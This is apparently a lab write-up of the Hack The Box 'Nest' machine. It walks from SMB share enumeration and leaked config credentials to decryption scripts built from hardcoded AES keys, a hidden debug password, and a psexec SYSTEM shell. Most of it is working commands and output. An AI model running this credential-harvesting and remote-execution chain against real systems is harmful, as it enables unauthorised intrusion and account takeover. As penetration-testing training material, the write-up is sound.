# About Nest
Nest is an easy difficulty Windows machine featuring an SMB server that permits guest access. The shares can be enumerated to gain credentials for a low privileged user. This user is found to have access to configuration files containing sensitive information. Another user&amp;amp;#039;s password is found through source code analysis, which is used to gain a foothold on the box. A custom service is found to be running, which is enumerated to find and decrypt Administrator credentials.

To begin the engagement, I launched a full TCP port scan against the target to identify open ports and service versions. I wanted to be thorough, so I scanned all 65,535 TCP ports using nmap with aggressive timing and service/version detection.


```bash
nmap -p- --min-rate 1000 -T4 -sV -sC -oN full_tcp_scan.txt 10.129.149.247
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-22 13:39 CDT
Stats: 0:01:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 95.39% done; ETC: 13:40 (0:00:04 remaining)
Stats: 0:01:36 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:01:43 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 13:41 (0:00:16 remaining)
Stats: 0:03:29 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 13:44 (0:02:03 remaining)
Nmap scan report for 10.129.149.247
Host is up (0.075s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help: 
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR <Directory_Name>
|     RUNQUERY <Query_ID>
|     DEBUG <Password>
|_    HELP <Command>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4386-TCP:V=7.94SVN%I=7%D=7/22%Time=687FDB2A%P=x86_64-pc-linux-gnu%r
SF:(NULL,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Generic
SF:Lines,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecogn
SF:ised\x20command\r\n>")%r(GetRequest,3A,"\r\nHQK\x20Reporting\x20Service
SF:\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(HTTPOptions,3A,"
SF:\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20co
SF:mmand\r\n>")%r(RTSPRequest,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2
SF:\r\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(RPCCheck,21,"\r\nHQK\x20R
SF:eporting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSVersionBindReqTCP,21,"\r\n
SF:HQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSStatusRequestTCP,2
SF:1,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Help,F2,"\r\nH
SF:QK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nThis\x20service\x20allo
SF:ws\x20users\x20to\x20run\x20queries\x20against\x20databases\x20using\x2
SF:0the\x20legacy\x20HQK\x20format\r\n\r\n---\x20AVAILABLE\x20COMMANDS\x20
SF:---\r\n\r\nLIST\r\nSETDIR\x20<Directory_Name>\r\nRUNQUERY\x20<Query_ID>
SF:\r\nDEBUG\x20<Password>\r\nHELP\x20<Command>\r\n>")%r(SSLSessionReq,21,
SF:"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TerminalServerCo
SF:okie,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TLSSessi
SF:onReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Kerbero
SF:s,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(SMBProgNeg,
SF:21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(X11Probe,21,"
SF:\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(FourOhFourRequest
SF:,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\
SF:x20command\r\n>")%r(LPDString,21,"\r\nHQK\x20Reporting\x20Service\x20V1
SF:\.2\r\n\r\n>")%r(LDAPSearchReq,21,"\r\nHQK\x20Reporting\x20Service\x20V
SF:1\.2\r\n\r\n>")%r(LDAPBindReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1
SF:\.2\r\n\r\n>")%r(SIPOptions,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.
SF:2\r\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(LANDesk-RC,21,"\r\nHQK\x
SF:20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TerminalServer,21,"\r\nHQK
SF:\x20Reporting\x20Service\x20V1\.2\r\n\r\n>");

Host script results:
| smb2-time: 
|   date: 2025-07-22T18:43:20
|_  start_date: 2025-07-22T18:34:33
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

Nmap output included banner-like responses from various probes, all showing the same string:

```bash
HQK Reporting Service V1.2
```
The banner and command structure suggested that the service running on port 4386 is some kind of legacy query engine called HQK Reporting Service V1.2, which may allow execution of stored queries or interaction with a backend database.

After identifying port 445/tcp as open from my earlier Nmap scan, I moved on to enumerate available SMB shares. I began with an anonymous listing using smbclient.

```bash
smbclient -N -L //10.129.149.154

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Data            Disk      
	IPC$            IPC       Remote IPC
	Secure$         Disk      
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.149.154 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```

Despite the fallback issue, I could still interact with the shares using smbclient directly.


```bash
smbclient //10.129.149.154/Data 
```

I began exploring the Shared directory and navigated deeper. I found a small file:


```nginx
smb: \Shared\Templates\HR\> ls
  .                                   D        0  Wed Aug  7 14:08:01 2019
  ..                                  D        0  Wed Aug  7 14:08:01 2019
  Welcome Email.txt                   A      425  Wed Aug  7 17:55:36 2019

		5242623 blocks of size 4096. 1840743 blocks available
smb: \Shared\Templates\HR\> get "Welcome Email.txt"
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (1.4 KiloBytes/sec) (average 0.8 KiloBytes/sec)
```

```bash
 cat 'Welcome Email.txt'
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR
```
Authenticated access to the Data share revealed multiple directories:


```bash
smbclient //10.129.149.154/Data -U TempUser
```

Downloaded RU_config.xml:


```bash
smb: \IT\Configs\RU Scanner\> ls
  .                                   D        0  Wed Aug  7 15:01:13 2019
  ..                                  D        0  Wed Aug  7 15:01:13 2019
  RU_config.xml                       A      270  Thu Aug  8 14:49:37 2019

		5242623 blocks of size 4096. 1839561 blocks available
smb: \IT\Configs\RU Scanner\> get RU_config.xml
getting file \IT\Configs\RU Scanner\RU_config.xml of size 270 as RU_config.xml (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
```

Found a pair of credentials.

```bash
cat RU_config.xml
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
```
This file contains a base64-encoded, AES-encrypted password associated with the user c.smith.


Explored further paths and downloaded more config files:


```bash
smb: \IT\Configs\Microsoft\> ls
  .                                   D        0  Wed Aug  7 14:23:26 2019
  ..                                  D        0  Wed Aug  7 14:23:26 2019
  Options.xml                         A     4598  Sat Mar  3 13:24:24 2012

		5242623 blocks of size 4096. 1839497 blocks available
smb: \IT\Configs\Microsoft\> get Options.xml
getting file \IT\Configs\Microsoft\Options.xml of size 4598 as Options.xml (11.5 KiloBytes/sec) (average 6.9 KiloBytes/sec)
```
Within the Options.xml, a Notepad++ history pointed to a sensitive path:

```bash
cat config.xml


<snip>

  </FindHistory>
    <History nbMaxFile="15" inSubMenu="no" customLength="-1">
        <File filename="C:\windows\System32\drivers\etc\hosts" />
        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
    </History>
</NotepadPlus>
```

Used smbget to recursively download files from Secure$:

```bash
smbget -U TempUser -R smb://10.129.149.154/Secure$/IT/Carl
Password for [TempUser] connecting to //10.129.149.154/Secure$: 
Using workgroup WORKGROUP, user TempUser
smb://10.129.149.154/Secure$/IT/Carl/Docs/ip.txt                                                                                                                                             
smb://10.129.149.154/Secure$/IT/Carl/Docs/mmc.txt                                                                                                                                            
smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/ConfigFile.vb                                                                                                              
smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/Module1.vb                                                                                                                 
smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Application.Designer.vb                                                                                         
smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Application.myapp                                                                                               
smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/AssemblyInfo.vb                                                                                                 
smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Resources.Designer.vb                                                                                           
smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Resources.resx                                                                                                  
smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Settings.Designer.vb                                                                                            
smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Settings.settings                                                                                               
smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj                                                                                                          
smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj.user                                                                                                     
smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/SsoIntegration.vb                                                                                                          
smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/Utils.vb                                                                                                                   
smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner.sln                                                                                                                        
Downloaded 25.18kB in 20 seconds
```

Opened the `Utils` class from the RUScanner application, which handles encryption and decryption.

```vbs
﻿Imports System.Text
Imports System.Security.Cryptography
Public Class Utils

    Public Shared Function GetLogFilePath() As String
        Return IO.Path.Combine(Environment.CurrentDirectory, "Log.txt")
    End Function




    Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function EncryptString(PlainString As String) As String
        If String.IsNullOrEmpty(PlainString) Then
            Return String.Empty
        Else
            Return Encrypt(PlainString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function Encrypt(ByVal plainText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes(initVector)
        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes(saltValue)
        Dim plainTextBytes As Byte() = Encoding.ASCII.GetBytes(plainText)
        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)
        Dim keyBytes As Byte() = password.GetBytes(CInt(keySize / 8))
        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC
        Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(keyBytes, initVectorBytes)
        Using memoryStream As New IO.MemoryStream()
            Using cryptoStream As New CryptoStream(memoryStream, _
                                            encryptor, _
                                            CryptoStreamMode.Write)
                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length)
                cryptoStream.FlushFinalBlock()
                Dim cipherTextBytes As Byte() = memoryStream.ToArray()
                memoryStream.Close()
                cryptoStream.Close()
                Return Convert.ToBase64String(cipherTextBytes)
            End Using
        End Using
    End Function

    Public Shared Function Decrypt(ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)

        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

        Dim cipherTextBytes As Byte()
        cipherTextBytes = Convert.FromBase64String(cipherText)

        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)

        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        Dim memoryStream As IO.MemoryStream
        memoryStream = New IO.MemoryStream(cipherTextBytes)

        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)

        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)

        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)

        Return plainText
    End Function

```

**Key Takeaway:**
* The encryption/decryption uses AES-CBC mode.

* Key is derived via PBKDF2 with a passphrase "N3st22", salt "88552299", 2 iterations, and IV "464R5DFA5DL6LE28".

* Key size is 256 bits

I translated the decrypt logic into a bash script using Python for decryption:

```bash
nano decrypt.sh
#!/bin/bash

CIPHERTEXT="$1"

python3 - <<EOF
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

passphrase = "N3st22"
salt = b"88552299"
iv = b"464R5DFA5DL6LE28"
key = PBKDF2(passphrase, salt, dkLen=32, count=2)
cipher = AES.new(key, AES.MODE_CBC, iv)

ciphertext = b64decode("$CIPHERTEXT")
decrypted = cipher.decrypt(ciphertext)
plaintext = decrypted[:-decrypted[-1]]
print(plaintext.decode("ascii"))
EOF
```
Make executable and run:


```bash
chmod +x decrypt.sh
./decrypt.sh "fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="
xRxRxPANCAK3SxRxRx
```

Used the decrypted password to access the SMB share for user C.Smith:

```bash
smbclient //10.129.149.154/Users -U C.Smith 
Password for [WORKGROUP\C.Smith]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 25 17:04:21 2020
  ..                                  D        0  Sat Jan 25 17:04:21 2020
  Administrator                       D        0  Fri Aug  9 10:08:23 2019
  C.Smith                             D        0  Sun Jan 26 01:21:44 2020
  L.Frost                             D        0  Thu Aug  8 12:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 12:02:50 2019
  TempUser                            D        0  Wed Aug  7 17:55:56 2019

```
Downloaded user.txt and discovered Debug Mode Password.txt:Password alternate data stream:


```bash
smb: \C.Smith\> ls
  .                                   D        0  Sun Jan 26 01:21:44 2020
  ..                                  D        0  Sun Jan 26 01:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 18:06:17 2019
  user.txt                            A       34  Tue Jul 22 14:01:12 2025


smb: \C.Smith\> get user.txt

smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 06:06:12 PM 2019 CDT
access_time:    Thu Aug  8 06:06:12 PM 2019 CDT
write_time:     Thu Aug  8 06:08:17 PM 2019 CDT
change_time:    Wed Jul 21 01:47:12 PM 2021 CDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt:Password"
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password of size 15 as Debug Mode Password.txt:Password (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```
Content of password:

```bash
cat 'Debug Mode Password.txt:Password'
WBQ201953D8w 

```
Connected to service on port 4386:


```bash
telnet 10.129.149.154 4386
Trying 10.129.149.154...
Connected to 10.129.149.154.
Escape character is '^]'.

HQK Reporting Service V1.2

>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
>DEBUG WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available

```
Explored directories and queries:


```bash
>SETDIR C:\Program Files\HQK\

Current directory set to HQK
>LIST

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml
```

```bash
>SETDIR LDAP   

Current directory set to LDAP
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf
```
Output from SHOWQUERY 2 revealed LDAP credentials with encrypted password:


```ini
>SHOWQUERY 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
```


Using ilspycmd to decompile HqkLdap.exe revealed a similar encryption scheme but with different parameters:

```bash
ilspycmd -o DecompiledOutput/ "HqkLdap.exe"
```

```bash
public class CR
	{
		private const string K = "667912";

		private const string I = "1L1SA61493DRV53Z";

		private const string SA = "1313Rf99";

		public static string DS(string EncryptedString)
		{
			if (string.IsNullOrEmpty(EncryptedString))
			{
				return string.Empty;
			}
			return RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
		}

		public static string ES(string PlainString)
		{
			if (string.IsNullOrEmpty(PlainString))
			{
				return string.Empty;
			}
			return RE(PlainString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
		}
````

Created a similar decrypt script for LDAP password:

```bash
#!/bin/bash

CIPHERTEXT="$1"

python3 - <<EOF
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

passphrase = "667912"
salt = b"1313Rf99"
iv = b"1L1SA61493DRV53Z"
iterations = 3
key_size = 32  # 256 bits

# Derive key
key = PBKDF2(passphrase, salt, dkLen=key_size, count=iterations)

# Decode and decrypt
ciphertext = b64decode("$CIPHERTEXT")
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(ciphertext)

# Remove PKCS7 padding
pad_len = decrypted[-1]
plaintext = decrypted[:-pad_len]

print(plaintext.decode("ascii", errors="ignore"))
EOF

```

Run the script:

```bash
./decrypt.sh "yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4="
XtH4nkS4Pl4y1nGX
```

Used the decrypted password to get a SYSTEM shell with Impacket’s psexec.py:


```bash
psexec.py administrator:XtH4nkS4Pl4y1nGX@10.129.149.154
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.149.154.....
[*] Found writable share ADMIN$
[*] Uploading file HkHXAQuO.exe
[*] Opening SVCManager on 10.129.149.154.....
[*] Creating service wXUy on 10.129.149.154.....
[*] Starting service wXUy.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
Navigated to Administrator desktop and retrieved the root flag:

```bash
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is E6FB-F2E9

 Directory of C:\Users\Administrator\Desktop

07/21/2021  07:27 PM    <DIR>          .
07/21/2021  07:27 PM    <DIR>          ..
07/22/2025  08:01 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   7,534,522,368 bytes free

C:\Users\Administrator\Desktop> type root.txt
af940f193b9cbXXXXX51aa3365f129c

````

